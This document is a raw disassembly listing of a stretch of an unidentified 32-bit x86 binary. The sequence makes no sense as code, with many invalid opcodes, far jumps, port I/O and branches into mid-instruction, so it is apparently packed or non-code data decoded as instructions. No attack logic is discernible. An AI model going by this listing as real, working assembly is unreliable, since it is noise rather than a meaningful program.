  423700:	es jb  0x423763
  423703:	cmp    eax,0x5a77dc9e
  423708:	pop    eax
  423709:	pop    eax
  42370a:	dec    ecx
  42370b:	int3   
  42370c:	add    dl,BYTE PTR ds:0x16ca2c1e
  423712:	sbb    ah,BYTE PTR [ecx]
  423714:	div    DWORD PTR [esi]
  423716:	push   edx
  423717:	mov    bl,0xd2
  423719:	fist   WORD PTR ds:0x2ab4b7a6
  42371f:	or     eax,0x13e7cc51
  423724:	lgs    edi,FWORD PTR [ecx]
  423727:	ins    DWORD PTR es:[edi],dx
  423728:	cmp    DWORD PTR [edx-0x42f8af3c],edx
  42372e:	out    0x57,eax
  423730:	rcl    DWORD PTR [edx],1
  423732:	dec    edi
  423733:	jns    0x42372b
  423735:	dec    esp
  423736:	dec    ecx
  423737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423738:	inc    ecx
  423739:	add    esp,ebp
  42373b:	push   ebp
  42373c:	test   bl,ah
  42373e:	aaa    
  42373f:	xchg   ecx,eax
  423740:	jle    0x4236d9
  423742:	bound  edi,QWORD PTR [ecx-0xb050239]
  423748:	hlt    
  423749:	adc    DWORD PTR ss:[edi-0x6d],esi
  42374d:	mov    DWORD PTR [ecx+0x33],ebx
  423750:	clc    
  423751:	sub    eax,0x1b0b7b89
  423756:	inc    ebx
  423757:	ja     0x4236fa
  423759:	push   esi
  42375a:	jmp    0xd140:0x6803cbfa
  423761:	arpl   WORD PTR [ebx],bp
  423763:	pop    eax
  423764:	xor    al,0x58
  423766:	and    DWORD PTR ds:0x94884485,esp
  42376c:	fcmovne st,st(6)
  42376e:	push   edx
  42376f:	sub    ebx,esi
  423771:	(bad)  
  423773:	in     eax,0xc5
  423775:	inc    edi
  423776:	test   DWORD PTR [edx],0x34f8280e
  42377c:	cmc    
  42377d:	push   edi
  42377e:	out    dx,eax
  42377f:	sub    ebp,DWORD PTR [ebp+0x38fbcb07]
  423785:	jns    0x423707
  423787:	inc    edi
  423788:	mov    al,ds:0x2a6cb256
  42378d:	ret    
  42378e:	mov    ebp,esi
  423790:	aam    0xbb
  423792:	xchg   edx,eax
  423793:	dec    esp
  423794:	repnz (bad) 
  423797:	call   0x18aa7340
  42379c:	test   DWORD PTR [edx],edi
  42379e:	leave  
  42379f:	cld    
  4237a0:	(bad)  
  4237a1:	hlt    
  4237a2:	push   edx
  4237a3:	retf   
  4237a4:	stos   DWORD PTR es:[edi],eax
  4237a5:	jmp    0x423736
  4237a7:	jg     0x4237dd
  4237a9:	aas    
  4237aa:	and    esi,DWORD PTR [eax]
  4237ac:	gs push eax
  4237ae:	in     al,0x46
  4237b0:	adc    al,0x6d
  4237b2:	inc    ebx
  4237b3:	xchg   ebp,eax
  4237b4:	dec    esi
  4237b5:	addr16 js 0x4237be
  4237b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b9:	or     DWORD PTR [edi+0x3938d521],ecx
  4237bf:	(bad)  
  4237c0:	push   0xf1e2d91f
  4237c5:	push   esi
  4237c6:	lods   eax,DWORD PTR ds:[esi]
  4237c7:	mov    al,0x51
  4237c9:	and    eax,0xc19565de
  4237ce:	sbb    ecx,DWORD PTR [ecx+0x68]
  4237d1:	jne    0x423817
  4237d3:	dec    ebx
  4237d4:	clc    
  4237d5:	or     BYTE PTR [esi],bl
  4237d7:	idiv   dh
  4237d9:	test   al,0x1d
  4237db:	ss and al,0x89
  4237de:	mov    cl,0xb6
  4237e0:	sbb    al,0x52
  4237e2:	push   ds
  4237e3:	mov    BYTE PTR [eax+0x53],dh
  4237e6:	jge    0x42380a
  4237e8:	jmp    0x423824
  4237ea:	ja     0x423803
  4237ec:	inc    esi
  4237ed:	leave  
  4237ee:	mov    ds:0x79e88283,al
  4237f3:	xor    cl,0x87
  4237f6:	pop    ebx
  4237f7:	pop    es
  4237f8:	in     eax,0x22
  4237fa:	data16 mov al,ds:0xcdaec40f
  423800:	inc    ebp
  423801:	mov    edi,0x25427b83
  423806:	mov    ds:0xdb515962,eax
  42380b:	std    
  42380c:	mov    bh,0xeb
  42380e:	sbb    al,0xae
  423810:	fld    QWORD PTR [ebx]
  423812:	(bad)  
  423813:	mov    bh,0x10
  423815:	xchg   edx,eax
  423816:	xchg   ecx,eax
  423817:	fcomp  QWORD PTR [ebp-0x1b]
  42381a:	dec    edx
  42381b:	imul   edx,DWORD PTR [ebp+0x29],0xfffffff7
  42381f:	ds clc 
  423821:	out    dx,eax
  423822:	fst    QWORD PTR [ecx-0x21]
  423825:	or     BYTE PTR [edi+edx*8],0xa1
  423829:	adc    eax,0x872f2a10
  42382e:	fcomp  QWORD PTR [eax+0x37]
  423831:	in     eax,0xa
  423833:	push   0x78
  423835:	pop    ebp
  423836:	mov    edx,0x88babab2
  42383b:	mov    ah,ah
  42383d:	sbb    BYTE PTR [edx-0x73526101],ch
  423843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423844:	or     bh,BYTE PTR ds:[ecx]
  423847:	inc    DWORD PTR [edx+0xb]
  42384a:	pop    ds
  42384b:	jns    0x4237eb
  42384d:	(bad)  
  42384e:	jb     0x423802
  423850:	aaa    
  423851:	cwde   
  423852:	add    DWORD PTR [ebp-0x22cb29dc],ecx
  423858:	inc    esi
  423859:	out    dx,al
  42385a:	outs   dx,BYTE PTR ds:[esi]
  42385b:	ss retf 0xb44d
  42385f:	das    
  423860:	sub    ah,BYTE PTR [ebx+0x59]
  423863:	xchg   ecx,eax
  423864:	test   al,0xa4
  423866:	sar    DWORD PTR [edi],0x42
  423869:	nop
  42386a:	in     eax,0xe5
  42386c:	xchg   DWORD PTR [ebp+0x56],eax
  42386f:	sub    DWORD PTR [edi+0x7d],ebp
  423872:	cwde   
  423873:	sbb    al,BYTE PTR [eax-0x1bb17015]
  423879:	jne    0x42380a
  42387b:	mov    cl,0xd1
  42387d:	inc    esp
  42387e:	dec    ebp
  42387f:	adc    DWORD PTR [edi-0x2d165bf6],ecx
  423885:	je     0x423861
  423887:	xchg   edi,eax
  423888:	mov    ds:0x7b250f80,eax
  42388d:	or     DWORD PTR [edx],eax
  42388f:	inc    ebx
  423890:	add    ah,BYTE PTR [eax]
  423892:	jle    0x4238ab
  423894:	xor    bh,BYTE PTR [ecx]
  423896:	stos   BYTE PTR es:[edi],al
  423897:	mov    ah,0x82
  423899:	mov    DWORD PTR [esi],eax
  42389b:	dec    edx
  42389c:	into   
  42389d:	and    al,0x2f
  42389f:	imul   ebx,DWORD PTR [eax-0x36],0x65
  4238a3:	lock shl BYTE PTR [edx+0x31],0x5c
  4238a8:	jo     0x423893
  4238aa:	fisttp QWORD PTR [edx+0x32283daa]
  4238b0:	(bad)  
  4238b1:	stc    
  4238b2:	jg     0x423855
  4238b4:	imul   ecx,DWORD PTR [esp+ebx*8],0x1e
  4238b8:	cwde   
  4238b9:	xlat   BYTE PTR ds:[ebx]
  4238ba:	fdiv   QWORD PTR [ebx+eiz*1-0x3deeb10e]
  4238c1:	sbb    eax,0x31437fca
  4238c6:	daa    
  4238c7:	inc    edx
  4238c8:	sbb    eax,0xd17e4e1a
  4238cd:	mov    eax,ds:0xb3c43571
  4238d2:	push   0x4bad8c9e
  4238d7:	push   edi
  4238d8:	pop    eax
  4238d9:	cmp    eax,0x2ec36c8b
  4238de:	cmp    ecx,DWORD PTR [eax+0x21]
  4238e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238e2:	mov    esi,0xd195c1c9
  4238e7:	ss jg  0x423962
  4238ea:	retf   0x18db
  4238ed:	and    edi,DWORD PTR [esi+0x0]
	...
  4238f8:	add    BYTE PTR [eax],al
  4238fa:	fnstsw WORD PTR [edi+ecx*4]
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	sbb    edi,DWORD PTR [edi]
  423908:	fdiv   st(0),st
  42390a:	shl    BYTE PTR [edx+0x1fd0001],0x0
  423911:	add    ah,bl
  423913:	push   0xcd7fdef0
  423918:	repnz (bad) 
  42391a:	jne    0x423990
  42391c:	xchg   edi,eax
  42391d:	ja     0x423930
  42391f:	xor    al,0x59
  423921:	ror    dh,0xba
  423924:	cmp    eax,0x25cf8d64
  423929:	cmc    
  42392a:	ret    0x4507
  42392d:	ror    DWORD PTR [edi],1
  42392f:	mov    bh,bl
  423931:	adc    edx,esi
  423933:	enter  0x4426,0x38
  423937:	fs icebp 
  423939:	dec    ebx
  42393a:	je     0x423961
  42393c:	sbb    ecx,edi
  42393e:	xchg   ebx,eax
  42393f:	jns    0x423923
  423941:	dec    edx
  423942:	pop    ss
  423943:	dec    edi
  423944:	scas   al,BYTE PTR es:[edi]
  423945:	inc    ebx
  423946:	push   ebp
  423947:	dec    edx
  423948:	daa    
  423949:	ja     0x4238ce
  42394b:	fldcw  WORD PTR [edx+0x2ef37cf4]
  423951:	jmp    0x4238f7
  423953:	or     al,0x3c
  423955:	ds cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  423958:	mov    edx,0x2fa6012e
  42395d:	jge    0x42399d
  42395f:	mov    edx,0x9a09f7a5
  423964:	popf   
  423965:	inc    esi
  423966:	xor    DWORD PTR [eax],esi
  423968:	or     ah,BYTE PTR [eax-0xba2c36e]
  42396e:	loop   0x423967
  423970:	pushf  
  423971:	cdq    
  423972:	mov    bh,0xf8
  423974:	sub    DWORD PTR [edx+0x1754ec6a],edi
  42397a:	jecxz  0x4239f9
  42397c:	mov    ebx,0x74e91536
  423981:	or     DWORD PTR [edi],esi
  423983:	int3   
  423984:	push   esi
  423985:	sbb    BYTE PTR [esi],ah
  423987:	xor    al,0xda
  423989:	mov    bh,0xd
  42398b:	mov    bl,0x57
  42398d:	test   eax,0xa5f35433
  423992:	mov    al,ds:0xcad64a9e
  423997:	inc    DWORD PTR ds:0xbff6d851
  42399d:	loop   0x42399d
  42399f:	pop    ss
  4239a0:	jl     0x42398d
  4239a2:	jne    0x423955
  4239a4:	fild   QWORD PTR [esi]
  4239a6:	pop    eax
  4239a7:	outs   dx,BYTE PTR ds:[esi]
  4239a8:	inc    esi
  4239a9:	adc    dl,BYTE PTR [ebp-0x575c7790]
  4239af:	movd   mm2,ecx
  4239b2:	sub    al,0xe0
  4239b4:	jle    0x4239f4
  4239b6:	cmp    al,0x7a
  4239b8:	adc    eax,0x7b893632
  4239bd:	int3   
  4239be:	jnp    0x4239b7
  4239c0:	xor    ebx,DWORD PTR [ecx+ecx*1]
  4239c3:	add    al,0x8f
  4239c5:	xor    DWORD PTR [edx+0x4f5278a6],eax
  4239cb:	and    bh,BYTE PTR [edx+0x21]
  4239ce:	mov    eax,ds:0x9c6959d9
  4239d3:	ret    
  4239d4:	call   0x51ff:0x748e2690
  4239db:	ins    DWORD PTR es:[edi],dx
  4239dc:	mov    cl,0x27
  4239de:	aaa    
  4239df:	mov    edx,0xd514d73
  4239e4:	mov    ch,0xaa
  4239e6:	mov    esp,0x84296475
  4239eb:	outs   dx,BYTE PTR ds:[esi]
  4239ec:	jmp    0x423a3a
  4239ee:	mov    ds:0xeb32238d,al
  4239f3:	pop    esp
  4239f4:	mov    ds:0x958e34ae,al
  4239f9:	in     eax,dx
  4239fa:	je     0x423a08
  4239fc:	pop    eax
  4239fd:	adc    ecx,DWORD PTR [esi+eax*2]
  423a00:	push   0x93b9392a
  423a05:	rcl    DWORD PTR ds:0x1653c045,cl
  423a0b:	xchg   edx,eax
  423a0c:	fiadd  WORD PTR [esi-0x40]
  423a0f:	iret   
  423a10:	das    
  423a11:	or     BYTE PTR [esi-0x65d82cd5],0xc5
  423a18:	int    0x7
  423a1a:	dec    ebp
  423a1b:	dec    ebx
  423a1c:	jnp    0x4239cf
  423a1e:	sub    eax,0x93219372
  423a23:	and    eax,0x9f7acc1a
  423a28:	call   0x598f:0x593d2f64
  423a2f:	xchg   edx,eax
  423a30:	in     eax,dx
  423a31:	add    al,al
  423a33:	out    dx,al
  423a34:	and    eax,0x79a7e9f0
  423a39:	push   cs
  423a3a:	adc    al,0x7
  423a3c:	xor    al,0x42
  423a3e:	mov    esi,0x2f556f58
  423a43:	push   eax
  423a44:	dec    eax
  423a45:	outs   dx,DWORD PTR ds:[esi]
  423a46:	mov    dh,0x90
  423a48:	adc    ebp,edx
  423a4a:	out    dx,eax
  423a4b:	stos   DWORD PTR es:[edi],eax
  423a4c:	mov    ds:0x14d83a8,al
  423a51:	and    DWORD PTR [ebp-0x39],ecx
  423a54:	test   eax,0x86f9451f
  423a59:	cmp    eax,0xbdd210a0
  423a5e:	call   0x83b8d898
  423a63:	and    ch,cl
  423a65:	aad    0xbe
  423a67:	push   esp
  423a68:	call   0x5ee8:0x38d9c6b7
  423a6f:	lea    ecx,[esp+eax*4]
  423a72:	sbb    ah,cl
  423a74:	(bad)  
  423a76:	mov    esp,0x2b310f63
  423a7b:	test   BYTE PTR [ebx+0x7c],dl
  423a7e:	pop    ebx
  423a7f:	repnz sbb esi,edx
  423a82:	sbb    al,0xbf
  423a84:	jo     0x423ae2
  423a86:	xchg   ebp,eax
  423a87:	fisub  WORD PTR ds:0xaf0ca05
  423a8d:	hlt    
  423a8e:	test   ecx,esi
  423a90:	dec    esi
  423a91:	mov    ebx,0xe919be8a
  423a96:	dec    eax
  423a97:	mov    eax,0xde699be3
  423a9c:	popf   
  423a9d:	cdq    
  423a9e:	pop    ds
  423a9f:	ins    DWORD PTR es:[edi],dx
  423aa0:	(bad)  
  423aa1:	out    0x25,eax
  423aa3:	arpl   sp,sp
  423aa5:	push   DWORD PTR [edi-0x1202796c]
  423aab:	pushf  
  423aac:	cmp    al,0xba
  423aae:	in     eax,dx
  423aaf:	pushf  
  423ab0:	scas   eax,DWORD PTR es:[edi]
  423ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ab2:	mov    eax,0xe4c37bbc
  423ab7:	pusha  
  423ab8:	cmp    al,0x5a
  423aba:	mov    ds:0xc5538fe3,eax
  423abf:	or     al,0x7f
  423ac1:	jmp    0x423b23
  423ac3:	sar    DWORD PTR [esi],1
  423ac5:	adc    dh,BYTE PTR [ebp+0x3b4f5f93]
  423acb:	scas   eax,DWORD PTR es:[edi]
  423acc:	push   ss
  423acd:	aas    
  423ace:	sbb    eax,0xa49219d4
  423ad3:	jns    0x423b2b
  423ad5:	gs inc esi
  423ad7:	aam    0x58
  423ad9:	and    DWORD PTR [eax-0x1a7114f1],edx
  423adf:	sub    ebx,edi
  423ae1:	out    0x2d,al
  423ae3:	mov    bl,0xd4
  423ae5:	addr16 or al,0x29
  423ae8:	jp     0x423a71
  423aea:	fstp   QWORD PTR [ebp+0x2f]
  423aed:	repnz in al,0x19
  423af0:	in     eax,0x8f
  423af2:	fndisi(8087 only) 
  423af4:	in     eax,dx
  423af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423af6:	rcr    BYTE PTR [edx+0x37],cl
  423af9:	sub    DWORD PTR [edx+0x56],ebx
  423afc:	icebp  
  423afd:	cdq    
  423afe:	jae    0x423b29
  423b00:	mov    edx,0x9b5a8e81
  423b05:	in     eax,0x2d
  423b07:	dec    ebx
  423b08:	int    0xdb
  423b0a:	(bad)  
  423b0b:	pushw  es
  423b0d:	jecxz  0x423b2a
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b49
  423b27:	shl    BYTE PTR [edx+0x1b4bdd2],cl
  423b2d:	add    ch,bh
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    cl,dl
  423b33:	jnp    0x423abe
  423b35:	mov    al,0x55
  423b37:	js     0x423baf
  423b39:	in     al,dx
  423b3a:	mov    edi,0x88ccde97
  423b3f:	pop    esi
  423b40:	sub    al,0xf4
  423b42:	loope  0x423b3c
  423b44:	in     al,0x90
  423b46:	lahf   
  423b47:	shl    DWORD PTR [esi+0x53],0x2b
  423b4b:	mov    bl,0xeb
  423b4d:	jl     0x423bbe
  423b4f:	pop    edi
  423b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b51:	mov    dl,0xc4
  423b53:	adc    eax,0x92e4124b
  423b58:	xchg   esi,eax
  423b59:	scas   eax,DWORD PTR es:[edi]
  423b5a:	test   eax,0xcadde77
  423b5f:	sub    al,0xd
  423b61:	ror    bh,cl
  423b63:	aad    0x61
  423b65:	sbb    BYTE PTR [edx+edx*8],bh
  423b68:	xchg   ebp,eax
  423b69:	(bad)  
  423b6b:	lds    eax,FWORD PTR [edi-0x72]
  423b6e:	push   esp
  423b6f:	shl    BYTE PTR [ebx],0x8c
  423b72:	fld    st(4)
  423b74:	clc    
  423b75:	es mov dh,0xa2
  423b78:	ret    0x86f4
  423b7b:	jp     0x423b4c
  423b7d:	sub    ebx,DWORD PTR [esp+eax*2]
  423b80:	add    eax,0xce122c7
  423b85:	inc    esi
  423b86:	jb     0x423bbc
  423b88:	dec    eax
  423b89:	cmp    eax,DWORD PTR [ebp+0x1591aa91]
  423b8f:	fist   WORD PTR [eax]
  423b91:	mov    bh,0xe1
  423b93:	out    0xac,al
  423b95:	xchg   edx,eax
  423b96:	nop
  423b97:	adc    DWORD PTR [ecx+0x6d841ca4],ecx
  423b9d:	push   cs
  423b9e:	loop   0x423b5f
  423ba0:	(bad)  
  423ba1:	fmulp  st(7),st
  423ba3:	xor    BYTE PTR ds:0x32bee59e,al
  423ba9:	stos   DWORD PTR es:[edi],eax
  423baa:	cmp    al,0x12
  423bac:	sub    dl,BYTE PTR [ebx]
  423bae:	fwait
  423baf:	adc    ebx,esi
  423bb1:	jo     0x423be8
  423bb3:	js     0x423b3d
  423bb5:	sti    
  423bb6:	fdivr  DWORD PTR [edx-0x6a6f570d]
  423bbc:	adc    DWORD PTR [esi-0x7b],0x41
  423bc0:	mov    esp,0xf091e11a
  423bc5:	test   ch,0xdd
  423bc8:	stos   DWORD PTR es:[edi],eax
  423bc9:	add    bh,BYTE PTR [esi+0x34ddb685]
  423bcf:	les    edx,FWORD PTR [esi+0x13]
  423bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bd3:	pop    esp
  423bd4:	jl     0x423bb0
  423bd6:	ret    
  423bd7:	xor    eax,DWORD PTR [ebp+0x1c]
  423bda:	mov    dl,0x91
  423bdc:	fidivr DWORD PTR [eax]
  423bde:	ins    BYTE PTR es:[edi],dx
  423bdf:	ins    DWORD PTR es:[edi],dx
  423be0:	mov    ch,0x51
  423be2:	xchg   ebp,eax
  423be3:	pushw  ds
  423be5:	inc    ebp
  423be6:	(bad)  
  423be7:	jne    0x423bfe
  423be9:	scas   al,BYTE PTR es:[edi]
  423bea:	out    dx,al
  423beb:	mov    eax,0xf19dc2a8
  423bf0:	jle    0x423b93
  423bf2:	add    DWORD PTR [eax+0x9],esp
  423bf5:	inc    esi
  423bf6:	mov    eax,0x179a0a10
  423bfb:	inc    esi
  423bfc:	(bad)  [edx+0x5f]
  423bff:	inc    eax
  423c00:	mov    bh,0xbf
  423c02:	retf   
  423c03:	cs iret 
  423c05:	or     al,0x59
  423c07:	mov    eax,0xa7d581f1
  423c0c:	jg     0x423bee
  423c0e:	mov    dh,0x6
  423c10:	jle    0x423c56
  423c12:	rol    al,1
  423c14:	inc    ecx
  423c15:	cmp    eax,edi
  423c17:	js     0x423c11
  423c19:	call   0x34f129dd
  423c1e:	and    BYTE PTR [ecx-0x112e6f0a],0x7f
  423c25:	mov    al,ds:0x700a333
  423c2a:	fidivr DWORD PTR [ebx]
  423c2c:	das    
  423c2d:	sbb    DWORD PTR [edi+0x574156c1],0xfa186b35
  423c37:	mov    ebx,0x47b8ab6a
  423c3c:	in     al,0x25
  423c3e:	adc    ch,BYTE PTR [ebx+esi*8-0x7f1524d1]
  423c45:	push   ebp
  423c46:	mov    eax,0x970f0b5d
  423c4b:	dec    eax
  423c4c:	sbb    ah,BYTE PTR [ecx]
  423c4e:	mov    eax,ds:0xfea382ee
  423c53:	xchg   ecx,eax
  423c54:	jbe    0x423c79
  423c56:	mov    gs,WORD PTR [edi+ecx*8]
  423c59:	xor    BYTE PTR [edx-0x640e9635],dl
  423c5f:	arpl   WORD PTR [edx+0x14],sp
  423c62:	sub    DWORD PTR gs:[edx],0x90a8ff91
  423c69:	int3   
  423c6a:	leave  
  423c6b:	jl     0x423cb6
  423c6d:	sub    cl,BYTE PTR [esi+0x4a437bda]
  423c73:	jo     0x423cb8
  423c75:	std    
  423c76:	lea    edx,[edi-0x9843755]
  423c7c:	popf   
  423c7d:	inc    edx
  423c7e:	pusha  
  423c7f:	push   esi
  423c80:	sbb    ebp,edx
  423c82:	adc    DWORD PTR [edi+eax*8+0x55da4a7c],edx
  423c89:	mov    eax,ds:0xbbda2998
  423c8e:	inc    eax
  423c8f:	imul   esp,DWORD PTR [esi-0x55fadf57],0x8a2cbdcd
  423c99:	and    BYTE PTR [ebx+edi*1],0x19
  423c9d:	(bad)  
  423c9e:	int    0x64
  423ca0:	mov    dh,0xea
  423ca2:	es (bad) 
  423ca4:	pop    ds
  423ca5:	stos   DWORD PTR es:[edi],eax
  423ca6:	out    0xb,al
  423ca8:	xor    bh,BYTE PTR [ebp-0x77]
  423cab:	mov    esi,0x1aa6291d
  423cb0:	adc    edx,DWORD PTR [edi-0x4a]
  423cb3:	cwde   
  423cb4:	stc    
  423cb5:	inc    ebp
  423cb6:	push   ebx
  423cb7:	sbb    al,bl
  423cb9:	dec    eax
  423cba:	sti    
  423cbb:	jne    0x423d3a
  423cbd:	adc    dl,dh
  423cbf:	cmp    BYTE PTR [ebx+0x4],al
  423cc2:	cmp    edi,DWORD PTR [eax]
  423cc4:	and    BYTE PTR [ebx],0x47
  423cc7:	and    BYTE PTR [ebx+0xf],bh
  423cca:	jl     0x423c50
  423ccc:	(bad)  
  423ccd:	shl    DWORD PTR [esi+0x7cf3b1c4],cl
  423cd3:	add    DWORD PTR [edx-0x92f5d5c],ebp
  423cd9:	mov    dl,0x67
  423cdb:	jbe    0x423c5d
  423cdd:	or     ebx,DWORD PTR [edi-0x31e8be0b]
  423ce3:	ja     0x423cb9
  423ce5:	ja     0x423c88
  423ce7:	pop    es
  423ce8:	push   0x64
  423cea:	scas   eax,DWORD PTR es:[edi]
  423ceb:	or     esi,ebx
  423ced:	push   ebp
  423cee:	xor    edi,DWORD PTR [eax+0x33]
  423cf1:	into   
  423cf2:	jno    0x423cdd
  423cf4:	popa   
  423cf5:	in     al,0x86
  423cf7:	push   ebp
  423cf8:	add    edi,edi
  423cfa:	inc    edx
  423cfb:	loopne 0x423c83
  423cfd:	add    bl,BYTE PTR [edi]
  423cff:	add    ch,0x95
  423d02:	adc    ebx,DWORD PTR [edi+0x3f]
  423d05:	or     eax,DWORD PTR [ecx]
  423d07:	add    al,0x48
  423d09:	mov    bh,0x36
  423d0b:	push   ds
  423d0c:	mov    ch,0x26
  423d0e:	mov    ch,0xe5
  423d10:	sbb    al,0x7a
  423d12:	pushf  
  423d13:	int3   
  423d14:	jecxz  0x423d40
  423d16:	rcl    DWORD PTR [edx-0x2],0x6
  423d1a:	scas   al,BYTE PTR es:[edi]
  423d1b:	push   edx
  423d1c:	popf   
  423d1d:	cli    
  423d1e:	ja     0x423d30
  423d20:	mov    edi,0x935aaa42
  423d25:	sub    eax,0xae62b63d
  423d2a:	xor    ebp,ebx
  423d2c:	outs   dx,DWORD PTR ds:[esi]
  423d2d:	retf   
  423d2e:	add    DWORD PTR [eax],0x0
	...
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0x8b57ffb2
  423d47:	fcomi  st,st(5)
  423d49:	sbb    DWORD PTR [edx-0x2fffe4a],edi
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [ecx-0x6d777077],dl
  423d57:	dec    ecx
  423d58:	jb     0x423d61
  423d5a:	cwde   
  423d5b:	push   cs
  423d5c:	inc    esp
  423d5d:	sti    
  423d5e:	cmp    BYTE PTR [ecx-0xb],0x1d
  423d62:	mov    esi,0xafe3e797
  423d67:	push   0x959be04d
  423d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d6d:	nop
  423d6e:	test   DWORD PTR [esp+edi*1+0x3e9b2081],ecx
  423d75:	jno    0x423ddf
  423d77:	sbb    BYTE PTR [ebx-0x36],bh
  423d7a:	outs   dx,BYTE PTR ds:[esi]
  423d7b:	pop    ds
  423d7c:	push   eax
  423d7d:	mov    dl,0xe0
  423d7f:	push   edi
  423d80:	mov    edx,0x3be7eaa2
  423d85:	jmp    0xb73a:0x959839f8
  423d8c:	enterw 0xcc91,0x63
  423d91:	loopne 0x423d59
  423d93:	and    ebx,edi
  423d95:	jae    0x423ddb
  423d97:	push   edi
  423d98:	test   BYTE PTR [ecx-0x8e0dbb1],0x1
  423d9f:	inc    esi
  423da0:	mov    al,ds:0x79143a8e
  423da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423da6:	mov    ebx,0xa7254120
  423dab:	xor    BYTE PTR [ecx],bh
  423dad:	jo     0x423e15
  423daf:	aam    0x49
  423db1:	ret    0x7d13
  423db4:	shl    DWORD PTR [ebp+0x50d38fcd],0xe2
  423dbb:	mov    ebx,0xb5d3ce4d
  423dc0:	mov    dl,0xe7
  423dc2:	xor    DWORD PTR [ebx-0x173e3336],esp
  423dc8:	mov    ebx,0xf9b896d3
  423dcd:	pop    ebx
  423dce:	fsub   QWORD PTR [esi]
  423dd0:	and    edi,ebx
  423dd2:	clc    
  423dd3:	scas   al,BYTE PTR es:[edi]
  423dd4:	inc    ecx
  423dd5:	test   eax,0x327a30ba
  423dda:	gs jnp 0x423e13
  423ddd:	adc    BYTE PTR [ecx-0x57],bl
  423de0:	fwait
  423de1:	ret    
  423de2:	inc    edx
  423de3:	psubd  mm2,QWORD PTR [eax+0x35]
  423de7:	pop    ss
  423de8:	sub    eax,0x41d19514
  423ded:	xchg   ebp,eax
  423dee:	mov    bh,0x37
  423df0:	loopne 0x423e14
  423df2:	push   cs
  423df3:	sub    al,0xfe
  423df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423df6:	rol    BYTE PTR [esi+0x430811f1],1
  423dfc:	push   eax
  423dfd:	test   BYTE PTR [edi+0x1c3314ee],0x1c
  423e04:	imul   edi,eax,0xb257a071
  423e0a:	mov    esi,0x4587f848
  423e0f:	mov    cl,0x33
  423e11:	mov    cl,0x17
  423e13:	jmp    0x423e89
  423e15:	shl    BYTE PTR [eax+0x69642cdf],cl
  423e1b:	add    esp,DWORD PTR [esi+0x3]
  423e1e:	pop    eax
  423e1f:	lea    ebx,[edx]
  423e21:	popa   
  423e22:	adc    DWORD PTR [edi+0x3f],eax
  423e25:	add    al,0x6f
  423e27:	adc    ebx,DWORD PTR ss:[edi]
  423e2a:	pusha  
  423e2b:	retf   
  423e2c:	dec    esi
  423e2d:	pop    ecx
  423e2e:	jl     0x423e49
  423e30:	ds mov cl,0x9e
  423e33:	mov    edx,0x5aa69bb3
  423e38:	sbb    bh,ah
  423e3a:	mov    BYTE PTR [ecx-0x2a6eaa74],cl
  423e40:	stos   DWORD PTR es:[edi],eax
  423e41:	inc    ebx
  423e42:	retf   0x404c
  423e45:	dec    ecx
  423e46:	jge    0x423e21
  423e48:	retf   0xe696
  423e4b:	dec    edi
  423e4c:	adc    edi,DWORD PTR [edi]
  423e4e:	fbstp  TBYTE PTR [edi-0x20e627ce]
  423e54:	jne    0x423e9a
  423e56:	mov    dh,0xfa
  423e58:	mov    ah,0x2
  423e5a:	mov    gs,ebp
  423e5c:	loop   0x423e7f
  423e5e:	int    0xb8
  423e60:	outs   dx,DWORD PTR ds:[esi]
  423e61:	test   al,0x17
  423e63:	dec    DWORD PTR [ebx]
  423e65:	jle    0x423e5f
  423e67:	in     eax,0xd3
  423e69:	inc    eax
  423e6a:	xor    DWORD PTR [esi+ebx*2-0x38],0xc05f5307
  423e72:	dec    edx
  423e73:	xor    al,0x45
  423e75:	mov    edi,0x66865335
  423e7a:	sbb    eax,0x2a78d345
  423e7f:	fld    TBYTE PTR [esi+0x1d]
  423e82:	dec    edi
  423e83:	pop    edx
  423e84:	xor    ebp,ebx
  423e86:	add    BYTE PTR [edx-0xf48102f],ch
  423e8c:	mov    ch,0xc1
  423e8e:	push   es
  423e8f:	mov    dl,0x79
  423e91:	pop    edx
  423e92:	hlt    
  423e93:	lds    esp,FWORD PTR [edi+ebp*8]
  423e96:	xchg   esi,eax
  423e97:	sahf   
  423e98:	call   0x5fff:0x51f4b83e
  423e9f:	enter  0xf18c,0xe
  423ea3:	mov    fs,WORD PTR [ebx+ebx*8]
  423ea6:	mov    ds:0x626f5664,eax
  423eab:	fwait
  423eac:	ja     0x423e95
  423eae:	scas   al,BYTE PTR es:[edi]
  423eaf:	fadd   QWORD PTR [edx]
  423eb1:	int    0xbf
  423eb3:	sti    
  423eb4:	push   ss
  423eb5:	xchg   ebx,eax
  423eb6:	stos   BYTE PTR es:[edi],al
  423eb7:	enter  0xac59,0x40
  423ebb:	mov    dh,0x21
  423ebd:	fdivp  st(6),st
  423ebf:	xchg   ebp,eax
  423ec0:	repnz push ss
  423ec2:	mov    edi,0x48a5b3d4
  423ec7:	ds in  al,dx
  423ec9:	sbb    eax,0x31714a39
  423ece:	stos   BYTE PTR es:[edi],al
  423ecf:	cmp    BYTE PTR [eax+0x5c3953e9],0x6
  423ed6:	mov    bh,0xe0
  423ed8:	arpl   WORD PTR [esi],di
  423eda:	cmp    BYTE PTR fs:[ecx-0x28],bl
  423ede:	adc    al,0x73
  423ee0:	(bad)  
